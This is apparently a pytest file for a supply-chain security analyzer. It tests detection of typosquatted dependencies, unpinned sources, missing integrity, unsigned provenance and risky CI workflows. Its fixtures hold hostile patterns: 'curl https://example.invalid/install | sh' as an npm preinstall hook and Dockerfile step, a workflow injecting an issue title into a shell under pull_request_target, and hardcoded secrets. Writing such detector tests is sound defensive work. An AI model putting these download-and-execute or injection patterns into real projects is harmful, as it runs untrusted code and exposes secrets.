import base64
import hashlib
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "solvers" / "toolkits"))
import supplychain_depth as supply


def kinds(report):
    return {item["kind"] for item in report["findings"]}


def test_package_manifest_lock_integrity_lifecycle_and_trusted_name_comparison():
    manifest = {
        "name": "@corp/service", "dependencies": {
            "reqeusts": "latest", "safe": "1.2.3", "gitdep": "git+https://example.invalid/repo.git#main",
        },
        "scripts": {"preinstall": "curl https://example.invalid/install | sh"},
    }
    lock = {"packages": {
        "node_modules/reqeusts": {"version": "9.9.9", "resolved": "http://registry/req.tgz",
                                  "hasInstallScript": True},
        "node_modules/safe": {"version": "1.2.3", "resolved": "https://registry/safe.tgz",
                              "integrity": "sha512-ok"},
    }}
    report = supply.analyze_package_manifest(manifest, lock, trusted_names=["requests"])
    assert {
        "trusted-name-near-match", "floating-dependency", "unpinned-git-dependency",
        "dependency-missing-from-lock", "insecure-package-resolution", "missing-lock-integrity",
        "dependency-install-script", "download-and-execute-script", "package-lifecycle-script",
        "scoped-package-registry-unspecified",
    } <= kinds(report)
    assert report["locked_names"] == ["reqeusts", "safe"]


def test_text_lock_formats_find_unpinned_and_missing_integrity():
    requirements = "requests==2.32.0 --hash=sha256:abc\nflask>=3\ngit+https://example/repo.git\n"
    req = supply.analyze_text_lockfile(requirements, "requirements.txt")
    assert {"unpinned-python-requirement", "python-requirement-without-hash",
            "unpinned-vcs-requirement"} <= kinds(req)
    cargo = '''
[[package]]
name = "registry-no-sum"
version = "1.0.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
[[package]]
name = "git-floating"
version = "1.0.0"
source = "git+https://example.invalid/repo"
'''
    cargo_report = supply.analyze_text_lockfile(cargo, "Cargo.lock")
    assert {"cargo-package-without-checksum", "cargo-unpinned-git-source"} <= kinds(cargo_report)
    go_report = supply.analyze_text_lockfile("good/module v1.0.0 h1:abc\nbad record\n", "go.sum")
    assert kinds(go_report) == {"malformed-go-sum"}


def test_cyclonedx_graph_and_supplied_artifact_digest_verification():
    artifact = b"actual artifact"
    bom = {
        "bomFormat": "CycloneDX", "specVersion": "1.5",
        "components": [
            {"bom-ref": "pkg:a", "name": "a", "version": "1.0", "purl": "pkg:npm/a@1.0",
             "hashes": [{"alg": "SHA-256", "content": "0" * 64}]},
            {"bom-ref": "pkg:a", "name": "duplicate"},
        ],
        "dependencies": [{"ref": "pkg:a", "dependsOn": ["pkg:missing"]}],
    }
    report = supply.analyze_sbom(bom, {"a": artifact})
    assert {"duplicate-sbom-reference", "sbom-component-without-version",
            "sbom-component-without-identity", "dangling-sbom-reference",
            "sbom-artifact-digest-mismatch"} <= kinds(report)
    assert report["format"] == "cyclonedx"


def test_spdx_shape_and_provenance_dsse_subject_verification():
    spdx = {"spdxVersion": "SPDX-2.3", "SPDXID": "SPDXRef-DOCUMENT",
            "packages": [{"SPDXID": "SPDXRef-A", "name": "a", "filesAnalyzed": False}],
            "relationships": [{"spdxElementId": "SPDXRef-A", "relationshipType": "DEPENDS_ON",
                               "relatedSpdxElement": "SPDXRef-Missing"}]}
    assert {"spdx-package-unverified", "dangling-sbom-reference"} <= kinds(supply.analyze_sbom(spdx))

    statement = {
        "_type": "https://in-toto.io/Statement/v1",
        "subject": [{"name": "app.bin", "digest": {"sha256": "0" * 64}}],
        "predicateType": "https://slsa.dev/provenance/v1",
        "predicate": {"buildType": "test", "builder": {"id": "builder://trusted"},
                      "buildDefinition": {"resolvedDependencies": [{"uri": "git+example", "digest": {"sha1": "a"}}]}},
    }
    envelope = {"payloadType": "application/vnd.in-toto+json",
                "payload": base64.b64encode(json.dumps(statement).encode()).decode(), "signatures": []}
    report = supply.analyze_provenance(envelope, {"app.bin": b"different"})
    assert {"unsigned-dsse-envelope", "provenance-subject-mismatch"} <= kinds(report)
    assert report["envelope"]["payload_type"] == "application/vnd.in-toto+json"


def test_well_formed_provenance_matches_supplied_subject():
    artifact = b"content"
    statement = {
        "_type": "https://in-toto.io/Statement/v1",
        "subject": [{"name": "artifact", "digest": {"sha256": hashlib.sha256(artifact).hexdigest()}}],
        "predicateType": "https://slsa.dev/provenance/v1",
        "predicate": {"builder": {"id": "builder://id"}, "buildType": "build://type",
                      "buildDefinition": {"resolvedDependencies": [{"uri": "git", "digest": {"sha1": "a"}}]}},
    }
    report = supply.analyze_provenance(statement, {"artifact": artifact})
    assert report["findings"] == []


def test_github_workflow_detects_target_context_injection_unpinned_actions_and_secrets():
    workflow = {
        "on": {"pull_request_target": {}},
        "permissions": {"contents": "write", "id-token": "write"},
        "jobs": {"build": {
            "runs-on": ["self-hosted", "linux"],
            "steps": [
                {"uses": "actions/checkout@v4", "with": {"ref": "${{ github.event.pull_request.head.sha }}"}},
                {"run": "echo '${{ github.event.issue.title }}' | sh"},
                {"uses": "someone/action@main", "env": {"TOKEN": "${{ secrets.DEPLOY_TOKEN }}"}},
            ],
        }},
    }
    report = supply.analyze_github_workflow(workflow)
    assert {
        "workflow-oidc-token", "self-hosted-workflow-runner", "privileged-pull-request-target",
        "workflow-action-not-sha-pinned", "untrusted-checkout-in-target-context",
        "workflow-expression-injection", "secret-to-unpinned-action",
    } <= kinds(report)
    assert report["triggers"] == ["pull_request_target"]


def test_sha_pinned_readonly_workflow_avoids_high_risk_findings():
    workflow = {"on": ["push"], "permissions": "read-all", "jobs": {"test": {
        "runs-on": "ubuntu-latest",
        "steps": [{"uses": "actions/checkout@" + "a" * 40}, {"run": "pytest"}],
    }}}
    report = supply.analyze_github_workflow(workflow)
    assert report["findings"] == []


def test_container_actions_require_digest_and_untrusted_inputs_are_shell_sensitive():
    workflow = {"on": ["workflow_dispatch"], "permissions": "read-all", "jobs": {"build": {
        "runs-on": "ubuntu-latest", "steps": [
            {"uses": "docker://example.invalid/tool:latest"},
            {"run": "echo '${{ inputs.release_name }}'"},
        ]}}}
    report = supply.analyze_github_workflow(workflow)
    assert {"workflow-action-not-sha-pinned", "workflow-expression-injection"} <= kinds(report)


def test_dockerfile_and_build_context_find_unpinned_remote_and_layered_secrets():
    dockerfile = b"""FROM python:latest
ARG PRIVATE_KEY=literal
RUN apt-get install -y curl
RUN curl https://example.invalid/install.sh | sh
ADD https://example.invalid/tool /usr/bin/tool
COPY . /app
"""
    report = supply.analyze_dockerfile(dockerfile.decode())
    assert {"base-image-not-digest-pinned", "floating-base-image", "build-secret-in-arg-env",
            "unpinned-system-packages", "docker-download-and-execute", "remote-docker-add",
            "broad-build-context-copy"} <= kinds(report)
    context = supply.analyze_build_context({
        "Dockerfile": dockerfile,
        ".dockerignore": "node_modules\n",
        ".env": "API_KEY=abcdefghijklmnop",
        "app.py": "print('ok')",
        "node_modules/module.js": "ignored",
    })
    assert "node_modules/module.js" not in context["included_files"]
    assert {"secret-file-in-build-context", "secret-literal-in-build-context",
            "secret-copied-into-image"} <= kinds(context)


def test_iac_supply_chain_depth_for_terraform_helm_kustomize_and_images():
    terraform = {
        "module": {
            "remote": {"source": "git::https://example.invalid/iac.git?ref=main"},
            "registry": {"source": "corp/service/aws"},
        },
        "required_providers": {"aws": {"source": "hashicorp/aws"}},
        "workload": {"containers": [{"image": "registry.invalid/app:latest"}]},
    }
    report = supply.analyze_iac_supply_chain(terraform)
    assert {"terraform-module-not-commit-pinned", "terraform-module-version-missing",
            "terraform-provider-unconstrained", "iac-image-not-digest-pinned"} <= kinds(report)

    helm = {"apiVersion": "v2", "dependencies": [
        {"name": "db", "version": "~1.2", "repository": "http://charts.invalid"}],
        "resources": ["https://github.com/corp/manifests//base?ref=main"]}
    report = supply.analyze_iac_supply_chain(helm)
    assert {"helm-chart-not-exactly-pinned", "insecure-helm-repository",
            "kustomize-remote-not-commit-pinned"} <= kinds(report)


def test_iac_literal_secret_exposures_are_distinct_from_dynamic_references():
    kubernetes = supply.analyze_iac_supply_chain({
        "apiVersion": "v1", "kind": "Secret", "stringData": {"password": "literal"}})
    assert "literal-kubernetes-secret" in kinds(kubernetes)
    configmap = supply.analyze_iac_supply_chain({
        "apiVersion": "v1", "kind": "ConfigMap",
        "data": {"API_TOKEN": "hardcoded-value", "PASSWORD_REF": "${secret_ref}"}})
    assert [item["path"] for item in configmap["findings"]
            if item["kind"] == "secret-in-configmap"] == ["data.API_TOKEN"]
    cloudformation = supply.analyze_iac_supply_chain({
        "Parameters": {"DatabasePassword": {"Type": "String", "Default": "hunter2"}},
        "Outputs": {"ApiToken": {"Value": {"Ref": "DatabasePassword"}}},
    })
    assert {"cloudformation-secret-parameter-visible", "cloudformation-secret-default",
            "sensitive-iac-output"} <= kinds(cloudformation)


def test_artifact_routing_and_caps(monkeypatch):
    sbom = {"bomFormat": "CycloneDX", "components": []}
    assert supply.analyze_artifact(json.dumps(sbom).encode(), "bom.json")["kind"] == "sbom-analysis"
    assert supply.analyze_artifact(b"requests>=2\n", "requirements.txt")["kind"] == "text-lockfile-analysis"
    monkeypatch.setattr(supply, "MAX_INPUT", 2)
    with pytest.raises(ValueError, match="cap"):
        supply.analyze_artifact(b"{} ", "x.json")
